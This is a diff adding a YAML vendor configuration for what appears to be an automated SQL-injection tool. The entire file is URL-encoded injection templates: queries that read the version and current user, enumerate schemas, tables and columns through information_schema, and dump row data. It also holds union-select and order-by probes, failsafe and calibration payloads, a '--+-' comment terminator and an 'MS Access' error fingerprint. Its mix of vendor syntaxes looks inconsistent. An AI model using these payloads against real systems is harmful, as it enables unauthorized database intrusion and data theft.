@@ -1,0 +1,107 @@
+vendor: ""
+resource: 
+ info: |
+  select 
+      'version${ENCLOSE_VALUE_SQL}dbname${ENCLOSE_VALUE_SQL}user${TRAIL_SQL}'
+      r
+  from dual
+ schema: 
+  database: |
+   select 
+       rr
+       %26'${TRAIL_SQL}'
+       r
+   from (
+       select 
+           '${ENCLOSE_VALUE_SQL}'
+           %26t.schema_name
+           %26'${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+           rr
+       from
+          (select distinct schema_name from information_schema.schemata) t,
+          (select distinct schema_name from information_schema.schemata) t1
+       where t.schema_name >= t1.schema_name
+       group by t.schema_name
+       {limit}
+   ) a
+  table: |
+   select 
+       rr
+       %26'${TRAIL_SQL}'
+       r
+   from (
+       select 
+           '${ENCLOSE_VALUE_SQL}'
+           %26t.table_name
+           %26'${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+           rr
+       from
+          (select distinct table_name from information_schema.tables where table_schema = '${DATABASE}') t,
+          (select distinct table_name from information_schema.tables where table_schema = '${DATABASE}') t1
+       where t.table_name >= t1.table_name
+       group by t.table_name
+       {limit}
+   ) a
+  column: |
+   select 
+       rr
+       %26'${TRAIL_SQL}'
+       r
+   from (
+       select 
+           '${ENCLOSE_VALUE_SQL}'
+           %26t.column_name
+           %26'${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+           rr
+       from
+          (select distinct column_name from information_schema.columns where table_schema = '${DATABASE}' and table_name = '${TABLE}') t,
+          (select distinct column_name from information_schema.columns where table_schema = '${DATABASE}' and table_name = '${TABLE}') t1
+       where t.column_name >= t1.column_name
+       group by t.column_name
+       {limit}
+   ) a
+  row: 
+   query: |
+    select 
+        rr
+        %26'${TRAIL_SQL}'
+        r
+    from (
+        select 
+            '${ENCLOSE_VALUE_SQL}'
+            %26t.s
+            %26'${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+            rr
+        from
+           (select distinct ${FIELDS} s from ${DATABASE}.${TABLE}) t,
+           (select distinct ${FIELDS} s from ${DATABASE}.${TABLE}) t1
+        where t.s >= t1.s
+        group by t.s
+        {limit}
+    ) a
+   fields: 
+    field: "${FIELD}"
+    concat: "%26 '%7f' %26"
+strategy: 
+ configuration: 
+  slidingWindow: |
+   select 
+       '${LEAD}' 
+       %26substring(
+           r, 
+           ${INDEX},
+           65536
+       ) r 
+   from (${INJECTION})x
+  limit: "having count(*) between ${LIMIT} and ${LIMIT}"
+  failsafe: "select '' %26 (1337${INDICE}7330%2b1) r from dual"
+  calibrator: "string(65536, '${CALIBRATOR_SQL}')"
+  limitBoundary: 1
+  endingComment: "--+-"
+  fingerprint: 
+   errorMessage: 
+    - "MS Access"
+ normal: 
+  indices: "union select ${RESULT_RANGE} from (${INDICE_UNIQUE})"
+  capacity: "(select '${LEAD}${INDICE}' %26 ${CALIBRATOR} from dual)"
+  orderBy: "order by 1337"
